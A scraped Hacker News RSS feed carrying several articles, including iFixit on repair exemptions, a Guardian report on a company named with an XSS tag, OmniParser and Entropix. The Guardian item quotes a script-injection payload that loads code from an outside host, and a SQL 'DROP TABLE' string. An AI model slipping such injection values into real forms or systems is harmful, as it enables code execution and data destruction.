https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?resize=400%2C267&amp;ssl=1 400w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?resize=706%2C471&amp;ssl=1 706w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/6705497a23aa9.image_.jpg?w=370&amp;ssl=1 370w" sizes="(max-width: 780px) 100vw, 780px"><figcaption>Josh Payne pours a bucket of grains for the pigs Sept. 20 at the Payne family farm in Concordia. photo by Cory W. MacNeil, Missourian</figcaption></figure><p><em>Cory W. MacNeil contributed reporting for this story.</em></p><div><figure><img data-recalc-dims="1" decoding="async" width="780" height="780" data-attachment-id="748695" data-permalink="https://investigatemidwest.org/2024/10/11/regenerative-farming-practices-require-unlearning-past-advice/the-next-harvest-2/" data-orig-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?fit=1760%2C1760&amp;ssl=1" data-orig-size="1760,1760" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="the next harvest" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?fit=300%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?fit=780%2C780&amp;ssl=1" tabindex="0" role="button" src="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=780%2C780&amp;ssl=1" alt="" srcset="https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=1024%2C1024&amp;ssl=1 1024w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=150%2C150&amp;ssl=1 150w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=768%2C768&amp;ssl=1 768w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=1536%2C1536&amp;ssl=1 1536w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=1200%2C1200&amp;ssl=1 1200w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=800%2C800&amp;ssl=1 800w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=600%2C600&amp;ssl=1 600w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=400%2C400&amp;ssl=1 400w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=200%2C200&amp;ssl=1 200w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=1568%2C1568&amp;ssl=1 1568w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=706%2C706&amp;ssl=1 706w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?resize=100%2C100&amp;ssl=1 100w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1.webp?w=1760&amp;ssl=1 1760w, https://i0.wp.com/investigatemidwest.org/wp-content/uploads/2024/10/the-next-harvest-1-1024x1024.webp?w=370&amp;ssl=1 370w" sizes="(max-width: 780px) 100vw, 780px"></figure><p><em>A KBIA News Series exploring what needs to change to sustain agriculture. Reported and produced by&nbsp;<a href="https://www.kbia.org/people/jana-rose-schleis">Jana Rose Schleis.</a> Logo designed by Harrison Petty.<br></em></p></div><section id="block-18"><p>Type of work: </p><p>News Service <span>Produced externally by an organization we trust to adhere to journalistic standards.</span></p></section>	</div><!-- .entry-content -->

	<!-- .entry-footer -->

	
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We can now fix McDonald's ice cream machines (853 pts)]]></title>
            <link>https://www.ifixit.com/News/102368/victory-is-sweet-we-can-now-fix-mcdonalds-ice-cream-machines</link>
            <guid>41949098</guid>
            <pubDate>Fri, 25 Oct 2024 20:02:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.ifixit.com/News/102368/victory-is-sweet-we-can-now-fix-mcdonalds-ice-cream-machines">https://www.ifixit.com/News/102368/victory-is-sweet-we-can-now-fix-mcdonalds-ice-cream-machines</a>, See on <a href="https://news.ycombinator.com/item?id=41949098">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    
<p>Ever tried to get an ice cream at McDonald’s, only to hear, “Sorry, our machine’s broken?” You’re not the only one: <a href="https://mcbroken.com/">almost 15%</a> of ice cream machines at McDonald’s are broken right now around the US—and in New York, it’s 32%. But today, we won more ice cream, and things should start to change.</p>



<p>The U.S. Copyright Office <a href="https://public-inspection.federalregister.gov/2024-24563.pdf">just handed down a ruling</a> that marks an important victory for Right to Repair: we can now legally repair commercial food preparation equipment, including McDonald’s machines, without running afoul of copyright law.&nbsp;</p>



<p>We’ve been fighting for years to challenge the digital locks that manufacturers like Taylor (which makes McDonald’s ice cream machines) use to keep repair information out of reach, forcing expensive service calls for simple fixes. Digital locks blocking repair come from an archaic 1998 copyright law, and every three years, we get a chance to ask the Copyright Office to give us exemptions to that law. Last time, <a href="https://www.ifixit.com/News/54317/section-1201-exemptions-for-2021-repair-consoles-medical-devices">we won exemptions for basically all consumer equipment</a>, vehicles, and medical devices. The time before that, <a href="https://www.ifixit.com/News/11951/1201-copyright-final-rule">we won smartphones</a> and home appliances. This time, <a href="https://www.ifixit.com/News/92942/the-ftc-and-doj-call-for-ice-cream-machine-repair">the FTC and DOJ even weighed in</a> to support our petition.&nbsp;</p>



<p>But while this is a significant step forward, the battle is far from over. Any McDonald’s franchisee can hack your own machine, but if you want to share what you found with your friends or <a href="https://www.wired.com/story/kytch-taylor-mcdonalds-ice-cream-machine-smoking-gun/">sell a tool to help diagnose</a> and fix your machine, you’re out of luck. Plus, the ruling didn’t go nearly far enough in granting broader exemptions for repairing other commercial or industrial equipment.&nbsp;</p>



<p>Trust us, we’re not stopping there. This is a big win—and we’ll be celebrating with ice cream!—but copyright law still needs fixing before we’re free to fix everything we own.</p>



<h2>The Win: You’re Now Free to Hack Your Ice Cream Machine</h2>



<p>For years, McDonald’s franchise owners have struggled with error codes and malfunctioning ice cream machines that could only be fixed by manufacturer-authorized technicians. The machines would often sit broken for extended periods because owners couldn’t troubleshoot or repair them on their own, due to digital locks embedded in the machine’s software. These locks are <a href="https://www.scientificamerican.com/article/some-electronics-repairs-are-illegal-federal-law-could-change-that/">protected under Section 1201 of the Digital Millennium Copyright Act (DMCA)</a>, which generally makes it illegal to bypass software locks known as “technological protection measures,” even for legitimate repairs.</p>



<p>That changes today. Thanks to the new exemption granted by the Copyright Office, owners, repair technicians, and tinkerers can now legally bypass the software locks on retail-level commercial food preparation equipment, such as the Taylor ice cream machines. This allows for the diagnosis, maintenance, and repair of the machines without needing to rely on costly service calls or manufacturer intervention. The exemption also applies to other commercial kitchen equipment—we’ve heard about undocumented <a href="https://assets.breville.com/BES920/BES920_ANZ_IB_O21_FA_WEB.pdf">error codes in commercial espresso machines</a>, restaurant owners getting <a href="https://www.reddit.com/r/sheetz/comments/y35axd/sheetz_merrychef_manager_password/">locked out of their own commercial ovens</a>, and <a href="https://hvac-talk.com/vbb/threads/176851-ALTO-SHAAM-service-manuals">missing service manuals</a> for insulated cabinets. But we’re <a href="https://www.fastcompany.com/90923565/congress-mcdonalds-ice-cream-machines">especially excited</a> about the ice cream win.</p>



<p>For ice cream lovers everywhere, this could mean fewer “machine broken” signs at McDonald’s and more sundaes and McFlurries available when you want them. It’s tangible progress in the fight to regain control over the products we own.</p>



<figure><img fetchpriority="high" loading="lazy" decoding="async" width="1600" height="1200" src="https://valkyrie.cdn.ifixit.com/media/2020/10/19094648/oneplus_nord_tools.jpg" alt="" srcset="https://valkyrie.cdn.ifixit.com/media/2020/10/19094648/oneplus_nord_tools.jpg 1600w, https://valkyrie.cdn.ifixit.com/media/2020/10/19094648/oneplus_nord_tools-1536x1152.jpg 1536w, https://valkyrie.cdn.ifixit.com/media/2020/10/19094648/oneplus_nord_tools-1200x900.jpg 1200w" sizes="(max-width: 1600px) 100vw, 1600px"><figcaption>Repair’s pretty difficult without tools.</figcaption></figure>



<h2>The Problem: We Still Don’t Have Repair Tools</h2>



<p>Here’s the catch: while it’s now legal to circumvent the digital locks on these machines, the ruling does not allow us to share or distribute the tools necessary to do so. This is a major limitation. Most franchise owners and independent repair shops won’t have the technical expertise to create their own unlocking tools from scratch, meaning that while the door to repair has been opened, few will be able to walk through it without significant difficulty.</p>



<p>It is still a crime for iFixit to sell a tool to fix ice cream machines, and that’s a real shame. The ruling doesn’t change the underlying statute making it illegal to share or sell tools that bypass software locks. This leaves most of the repair work inaccessible to the average person, since the technical barriers remain high. Without these tools, this exemption is largely theoretical for many small businesses that don’t have in-house repair experts.</p>



<h2>The Miss: Broader Exemptions for Commercial and Industrial Equipment</h2>



<p>Even more disappointing is the denial of broader exemptions for commercial and industrial equipment. While we succeeded in securing an exemption for retail-level food equipment, the Copyright Office declined to extend similar protections to a wider class of commercial devices—meaning the ruling does not apply to things like heavy machinery, factory equipment, or even broader categories of restaurant hardware.</p>



<p>This was a key part of our petition, as the same issues plague repair in other industries. Many businesses, from farmers to factory owners, face the same frustrations: they are locked out of their own equipment by digital restrictions that prevent them from making repairs without calling in a certified technician. We pointed to examples like the <a href="https://social.hackerspace.pl/@q3k/111528162462505087">Polish trains</a> that were locked “for arbitrary reasons after being serviced at third-party workshops” with “bogus error codes,” <a href="https://www.reddit.com/r/PLC/comments/9dzlv1/safety_plccontroller_passwords/">multi-million dollar factory machines</a> getting bricked for a lack of software access, and a school that <a href="https://hvac-talk.com/vbb/threads/159467-NAE25-Metasyssyagent-Password-Reset">lost access to its HVAC system</a> when the maintenance technician passed away.</p>



<figure><p>
<iframe title="Forget about Sony and Netflix, there's DRM in public trains now...." width="456" height="257" src="https://www.youtube-nocookie.com/embed/w8NqBXT6Kos?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>We asked for an exemption that would cover all software-enabled commercial and industrial devices, but the Copyright Office denied this broader request, citing a lack of sufficient evidence that digital locks were creating adverse effects across a wider range of equipment.</p>



<p>Without this broader exemption, a significant portion of the repair market is still controlled by manufacturers, who can charge exorbitant prices for repair services and restrict access to parts and tools. This leaves many small businesses with no choice but to endure downtime and extra costs, even when a simple repair could get them back up and running quickly.</p>



<h2>Renewals: What We Won, What We Didn’t</h2>



<p>Every three years, the Copyright Office reviews the current exemptions and decides which ones to renew, expand, or let expire. This year, we secured several important renewals, though some gaps remain.</p>


<div>
    <p><span>
      Device Page    </span></p><div>
      <p><a href="https://www.ifixit.com/Device/Defibrillator">
          <img decoding="async" src="https://guide-images.cdn.ifixit.com/igi/GxJMngNjEyXdkcXb.medium" alt="Defibrillator">
        </a>
      </p>
      <div>
        <h3>Defibrillator</h3>
        <p>Repair information for defibrillators.</p>
        <p><a href="https://www.ifixit.com/Device/Defibrillator">
          View Device        </a>
      </p></div>
    </div>
  </div>


<h3>What We Won:</h3>



<p><strong>Medical Devices:</strong></p>



<p>Renewals were granted for medical devices, allowing technicians to access software controlling devices like defibrillators and insulin pumps. This helps ensure that life-saving equipment can be repaired quickly and efficiently, which is crucial for patient care. This renewal is essential for hospitals repairing their own equipment, and came despite heated opposition from AdvaMed. The medical device manufacturers are so upset about all of this that they are <a href="https://1technation.com/mita-advamed-appeal-dismissal-of-copyright-lawsuit/">suing the Copyright Office</a> over the last rulemaking that originally granted this exemption three years ago.</p>



<p><strong>Repair of Motorized Vehicles, Marine Vessels, and Agricultural Equipment:</strong></p>



<p>Exemptions allowing the repair of computer programs in motorized land vehicles, marine vessels, and mechanized agricultural equipment were renewed. This means farmers can continue to repair their tractors, and boat owners can fix their vessels without worrying about digital locks​.</p>



<p><strong>Consumer Devices:</strong></p>



<p>We also successfully renewed the exemption that allows repairs on consumer electronic devices, such as smartphones, tablets, and home appliances. This is a critical exemption for everyday consumers who want the right to repair their own gadgets without voiding warranties or violating copyright law​.</p>



<p><strong>Assistive Technologies:</strong></p>



<p>The exemptions for assistive technologies were renewed as well, ensuring that people with disabilities can access and use literary and musical works through assistive software without running afoul of copyright restrictions​.</p>



<figure><p>
<iframe title="Tobii 5: A NON-sponsored review of the premium tracking solution!" width="456" height="257" src="https://www.youtube-nocookie.com/embed/k2T0d8hWxwU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p><figcaption>Video game alternative input methods like eye tracking sometimes require getting around technological protection measures—and the Copyright Office declined to renew that exemption.</figcaption></figure>



<h3>What We Didn’t Win:</h3>



<p><strong>Video Game Accessibility:</strong></p>



<p>Unfortunately, the exemption allowing circumvention of digital locks on video games for accessibility purposes (introduced in 2021) was not renewed. No petition for renewal was submitted, and as a result, individuals with disabilities who need alternative input methods to play video games are left out.</p>



<p><strong>Broader Exemptions for Industrial Devices:</strong></p>



<p>As mentioned earlier, we failed to secure a broader exemption for industrial and commercial equipment. This leaves a huge number of businesses still locked out of the right to repair their own machinery​.</p>



<h2>Why Does This Matter?</h2>



<p>The Copyright Office’s ruling is a step in the right direction, but it’s far from the finish line. We’re thrilled to be able to fix ice cream machines, but without tools, most franchise owners won’t be able to take full advantage of this new freedom. And while retail food equipment is now covered, the vast world of commercial and industrial devices remains stuck in a repair monopoly, where manufacturers control who can fix what and at what cost.</p>



<p>This ruling highlights the ongoing battle between consumers and manufacturers over the right to repair. We’ve made significant strides, but we’re still facing systemic barriers that prevent small businesses and consumers from taking control of their own products.</p>



<h2>What’s Next?</h2>



<p>We’ll take today’s victory and keep fighting for more. Next on our list? Fixing federal copyright law, which is the only way we can secure access to the tools we need and share what we find as we troubleshoot our machines. iFixit CEO Kyle Wiens <a href="https://www.ifixit.com/News/78204/congress-asks-ifixit-if-the-right-to-repair-exists">testified before congress</a> last year about why this is so important, and we’re hoping to see US federal legislation like last session’s <a href="https://www.ifixit.com/News/56976/freedom-to-repair-act">Freedom to Repair Act</a>.</p>



<p>Meanwhile, Canada is in the final stages of <a href="https://www.parl.ca/legisinfo/en/bill/44-1/c-244">considering legislation</a> that would fix the Canadian version of the DMCA, a bill called C-244 that is in its third reading in the Senate and expected to move before the end of the month. If Canada legalized circumventing technological protection measures for the purposes of repair, we might just have to head north to find the tools we need to do repairs.</p>



<p>So go enjoy that McFlurry—just know that the fight to fix isn’t over yet.</p>
    
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Company named "><SCRIPT SRC=HTTPS://MJT.XSS.HT> LTD" forced to change it (2020) (476 pts)]]></title>
            <link>https://www.theguardian.com/uk-news/2020/nov/06/companies-house-forces-business-name-change-to-prevent-security-risk</link>
            <guid>41948666</guid>
            <pubDate>Fri, 25 Oct 2024 19:20:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theguardian.com/uk-news/2020/nov/06/companies-house-forces-business-name-change-to-prevent-security-risk">https://www.theguardian.com/uk-news/2020/nov/06/companies-house-forces-business-name-change-to-prevent-security-risk</a>, See on <a href="https://news.ycombinator.com/item?id=41948666">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="maincontent"><p>Companies House has forced a company to change its name after it belatedly realised it could pose a security risk.</p><p>The company now legally known as “THAT COMPANY WHOSE NAME USED TO CONTAIN HTML SCRIPT TAGS LTD” was set up by a British software engineer, who says he did it purely because he thought it would be “a fun playful name” for his consulting business.</p><p>He now says he didn’t realise that Companies House was actually vulnerable to the extremely simple technique he used, known as “cross-site scripting”, which allows an attacker to run code from one website on another.</p><p>The original name of the company was ““&gt;&lt;SCRIPT SRC=HTTPS://MJT.XSS.HT&gt; LTD”. By beginning the name with a quotation mark and chevron, any site which failed to properly handle the HTML code would have mistakenly thought the company name was blank, and then loaded and executed a script from the site XSS Hunter, which helps developers find cross-site scripting errors.</p><p>That script would have simply put up a harmless alert – but it serves as proof that a malicious attacker could instead have used the same weakness as a gateway to more damaging ends.</p><p>Similar names have been registered in the past, such as “; DROP TABLE “COMPANIES”;-- LTD”, a <a href="https://pizzey.me/blog/no-i-didnt-try-to-break-companies-house/" data-link-name="in body link">wry attempt</a> to carry out an attack known as SQL injection, <a href="https://xkcd.com/327/" data-link-name="in body link">inspired by a famous XKCD webcomic</a>, but this was the first such name to have prompted a response. Companies House has retroactively removed the original name from its data feeds, and all documentation referring to its original moniker now reads simply “Company name available on request”.</p><p>The director of the company, who asked not to be named, told the Guardian: “Government Digital Service - GDS - have a good reputation for security, and other companies with similarly playful names have been registered in the past, so I thought there probably wouldn’t be a problem.</p><p>“When I discovered there were some minor problems, I contacted Companies House and the <a href="https://www.theguardian.com/technology/2020/nov/03/covid-related-cybercrime-drives-attacks-on-uk-to-record-number" data-link-name="in body link">National Cyber Security Centre</a> immediately, and didn’t disclose the issue to anyone else.”</p><p>He did not realise it would be an issue, he said, because characters including &gt; and “ are explicitly allowed as company names, which suggested that the agency had put security measures in place to prevent such attacks.</p><p>A Companies House spokesperson said: “A company was registered using characters that could have presented a security risk to a small number of our customers, if published on unprotected external websites. We have taken immediate steps to mitigate this risk and have put measures in place to prevent a similar occurrence. We are confident that Companies House services remain secure.”</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OmniParser for Pure Vision Based GUI Agent (124 pts)]]></title>
            <link>https://microsoft.github.io/OmniParser/</link>
            <guid>41948433</guid>
            <pubDate>Fri, 25 Oct 2024 18:54:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://microsoft.github.io/OmniParser/">https://microsoft.github.io/OmniParser/</a>, See on <a href="https://news.ycombinator.com/item?id=41948433">Hacker News</a></p>
<div id="readability-page-1" class="page">


    <div>
                        <h2>OmniParser for Pure Vision Based GUI Agent</h2>
                        


                        <p><span>
                    <sup>1</sup>Microsoft Research,
                    <sup>2</sup>Microsoft Gen AI,<br> 

                        </span></p>

                        
                    </div>



    <!-- Paper abstract -->
    <div>
                        <h2>Abstract</h2>
                        <p>
                                The recent success of large vision language models shows great potential in driving the agent system operating on user interfaces. However, we argue that the
                                power multimodal models like GPT-4V as a general agent on multiple operating
                                systems across different applications is largely underestimated due to the lack of
                                a robust screen parsing technique capable of: 1. reliably identifying interactable
                                icons within the user interface, and 2. understanding the semantics of various
                                elements in a screenshot and accurately associate the intended action with the
                                corresponding region on the screen. To fill these gaps, we introduce OMNIPARSER,
                                a comprehensive method for parsing user interface screenshots into structured
                                elements, which significantly enhances the ability of GPT-4V to generate actions
                                that can be accurately grounded in the corresponding regions of the interface. We
                                first curated an interactable icon detection dataset using popular webpages and
                                an icon description dataset. These datasets were utilized to fine-tune specialized
                                models: a detection model to parse interactable regions on the screen and a caption
                                model to extract the functional semantics of the detected elements. OMNIPARSER
                                significantly improves GPT-4V's performance on ScreenSpot benchmark. And
                                on Mind2Web and AITW benchmark, OMNIPARSER with screenshot only input
                                outperforms the GPT-4V baselines requiring additional information outside of
                                screenshot
                            </p>
                    </div>
    <!-- End paper abstract -->



    <!-- Image carousel -->
    
    <!-- End image carousel -->


    <div>
                        <h2>Curated Dataset for Interactable Region Detection and Icon Functionality Description</h2>
                        <p>
                        We curate a dataset of interactable icon detection dataset, containing 67k unique screenshot images, each labeled with bounding boxes of interactable icons derived from DOM tree. We first took a 100k uniform sample of popular publicly availabe urls on the clueweb dataset, and collect bounding boxes of interactable regions of the webpage from the DOM tree of each urls. We also collected 7k icon-description
                        pairs for finetuning the caption model.
                        </p><div>
                            <p><img src="https://microsoft.github.io/OmniParser/static/images/curated_data.png" alt="Species Classification results on iWildCam2020-WILDS (OOD) dataset"></p><p>
                                <b>Examples from the Interactable Region Detection dataset. </b>. TThe bounding boxes are based on the interactable region extracted from the DOM tree of the webpage. 
                            </p>
                        </div>
                    </div>

<!-- 
    <section class="hero is-light is-small">
        <div class="hero-body">
          <div class="container">
            <div id="results-carousel" class="carousel results-carousel">
              <div class="item item-steve">
                <video poster="" id="steve" autoplay controls muted loop playsinline height="100%">
                  <source src="./static/videos/web_5_demo_nocap.mp4"
                          type="video/mp4">
                </video>
              </div>
              <div class="item item-chair-tp">
                <video poster="" id="chair-tp" autoplay controls muted loop playsinline height="100%">
                  <source src="./static/videos/web_22_demo_nocap.mp4"
                          type="video/mp4">
                </video>
              </div>
            </div>
          </div>
        </div>
    </section> -->
    
    <div>
                        <h2>Results</h2>
                        <p>
                        We evaluate our model on SeeClick, Mind2Web, and AITW benchmarks. We show that our model outperforms the GPT-4V baseline on all benchmarks. We also show that our model with screenshot only input outperforms the GPT-4V baselines requiring additional information outside of screenshot.
                        </p><p><img src="https://microsoft.github.io/OmniParser/static/images/seeclick.png" alt="seeclick">
                            <img src="https://microsoft.github.io/OmniParser/static/images/m2w.png" alt="mind2web">
                            <img src="https://microsoft.github.io/OmniParser/static/images/aitw.png" alt="aitw">
                        </p>
                    </div>

    
        <div>
                        <h2>Plugin-ready for Other Vision Language Models</h2>
                        <p>
                        To further demonstrate OmniParser is a plugin choice for off-the-shelf vision langauge models, we show the performance of OmniParser combined with recently announced vision language models: Phi-3.5-V and Llama-3.2-V. As seen in table, our finetuned interactable region detection (ID) model significantly improves the task performance compared to grounding dino model (w.o. ID) with local semantics across all subcategories for GPT-4V, Phi-3.5-V and Llama-3.2-V. In addition, the local semantics of icon functionality helps significantly with the performance for every vision language model. 

                        In the table, LS is short for local semantics of icon functionality, ID is short for the interactable region detection model we finetune. The setting w.o. ID means we replace the ID model with original Grounding DINO model not finetuned on our data, and with local semantics. The setting w.o. ID and w.o LS means we use Grounding DINO model, and further without using the icon description in the text prompt. 
                        </p><p><img src="https://microsoft.github.io/OmniParser/static/images/ablation.png" alt="seeclick">
                        </p>
                    </div>
    

    <div>
            <h2>Demo of Mind2Web Tasks </h2>
            
          
    </div>
    <br>

    <!-- BibTex citation -->
    <div id="BibTeX">
            <h2>Citation</h2>
            <!-- Please cite our paper if you use our code, data, model or results: -->
            <!-- <br> -->
            <pre><code>@misc{lu2024omniparserpurevisionbased,
                title={OmniParser for Pure Vision Based GUI Agent}, 
                author={Yadong Lu and Jianwei Yang and Yelong Shen and Ahmed Awadallah},
                year={2024},
                eprint={2408.00203},
                archivePrefix={arXiv},
                primaryClass={cs.CV},
                url={https://arxiv.org/abs/2408.00203}, 
          }
</code></pre>
        </div>


    





</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Federal investigators probe Tether (107 pts)]]></title>
            <link>https://www.wsj.com/finance/currencies/federal-investigators-probe-cryptocurrency-firm-tether-a13804e5</link>
            <guid>41947892</guid>
            <pubDate>Fri, 25 Oct 2024 18:08:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/finance/currencies/federal-investigators-probe-cryptocurrency-firm-tether-a13804e5">https://www.wsj.com/finance/currencies/federal-investigators-probe-cryptocurrency-firm-tether-a13804e5</a>, See on <a href="https://news.ycombinator.com/item?id=41947892">Hacker News</a></p>
Couldn't get https://www.wsj.com/finance/currencies/federal-investigators-probe-cryptocurrency-firm-tether-a13804e5: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Detecting when LLMs are uncertain (253 pts)]]></title>
            <link>https://www.thariq.io/blog/entropix/</link>
            <guid>41947566</guid>
            <pubDate>Fri, 25 Oct 2024 17:40:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.thariq.io/blog/entropix/">https://www.thariq.io/blog/entropix/</a>, See on <a href="https://news.ycombinator.com/item?id=41947566">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <div><p>This post tries to explain the new reasoning techniques developed by <a href="https://x.com/_xjdr">XJDR</a> in a new project called
<a href="https://github.com/xjdr-alt/entropix">Entropix</a>.</p><p>Entropix attempts to improve reasoning in models through being smarter at sampling during moments of uncertainty.</p><p>A big caveat, there have been no large scale evals yet for Entropix, so it’s not clear how much this helps in practice. But it does seem to introduce some promising techniques and mental models for reasoning.</p></div>
<h2 id="uncertainity-at-a-glance">Uncertainity at a glance</h2>
<p>Sampling is the process of choosing which token from the distribution of possible tokens (the logits) that a LLM chooses. You can tell how confident a model is in its predictions by looking at that distribution.</p>
<p>This is a <strong>confident</strong> model prediction for the next token:</p>
<p><img src="https://www.thariq.io/images/entropix/lowe-lowv.png" alt="Screenshot 2024-10-11 at 10.08.08 AM.png"></p><p>But in reality, models are not always so sure of their predictions. You will often run into cases where the next token prediction looks like this:</p>
<p><img src="https://www.thariq.io/images/entropix/lowe-highv.png" alt="Screenshot 2024-10-11 at 10.08.08 AM.png"><img src="https://www.thariq.io/images/entropix/highe-lowv.png" alt="Screenshot 2024-10-11 at 10.09.29 AM.png"></p>
<p>In these cases, the model is uncertain.</p>
<p>Entropix is a method for using <strong>adaptive sampling</strong> to make better decisions when the model is uncertain.</p>
<h3 id="what-does-uncertainity-mean-and-does-it-matter">What does uncertainity mean, and does it matter?</h3>
<p>This uncertainty in the logits might have many different underlying causes, and not all are bad.</p>
<p>Causes include:</p>
<ul>
<li>The tokens are synonyms or equivalent (e.g. good vs great)</li>
<li>There are branching paths (e.g. the AI could either write your program in Java or C)</li>
<li>The AI may genuinely not be sure what to do (it is ‘out of distribution’, it hasn’t seen this in its training data before).</li>
</ul>
<p>Entropix suggests that you should have <em>different methods</em> for choosing the next token, depending on how uncertain you are.</p>
<p>How do we do that? To start, we need to measure uncertainty.</p>
<h2 id="entropy-and-varentropy">Entropy and Varentropy</h2>
<p>The key tools that Entropix uses are two metrics that measure uncertainty: <strong>the entropy</strong> &amp; <strong>varentropy</strong> of the logits.</p>
<p>Entropy measures how different the predicted logits are from each other, i.e. how uncertain we are in the most probably outcome. In low entropy, we are pretty certain in a few of the logits. In high entropy, the distribution of the logits is more uniform and we are much less certain.</p>
<p>Varentropy is a different type of entropy metric. It gives us an idea of the “shape” of the uncertainty. High varentropy indicates that some of the values are highly different from others.</p>
<astro-island uid="ZPT0W8" prefix="r3" component-url="/_astro/SimpleExpandableBlock.-iQQRPjY.js" component-export="default" renderer-url="/_astro/client.BIGLHmRd.js" props="{&quot;heading&quot;:[0,&quot;The Math&quot;]}" ssr="" client="load" opts="{&quot;name&quot;:&quot;SimpleExpandableBlock&quot;,&quot;value&quot;:true}" await-children=""><template data-astro-template=""><p>Entropy &amp; Varentropy are based on the idea of <strong>surprisal</strong>.</p><p>Surprisal, also known as self-information, measures how unexpected or surprising an event is based on its probability. For an event x with probability P(x), the surprisal is:</p><div data-testid="react-katex"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo>−</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mo stretchy="false">(</mo><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x) = -\log_2(P(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span></span></span></span></span></div><p>The more unlikely an event is, the higher its surprisal. For example, if P(x) = 1/8, the surprisal is 3 bits, while if P(x) = 1/2, the surprisal is only 1 bit.</p><p>Entropy is the expected value (weighted average) of surprisal across all possible outcomes.</p><div data-testid="react-katex"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><mi>P</mi><mo stretchy="false">(</mo><mi>x</mi><mo 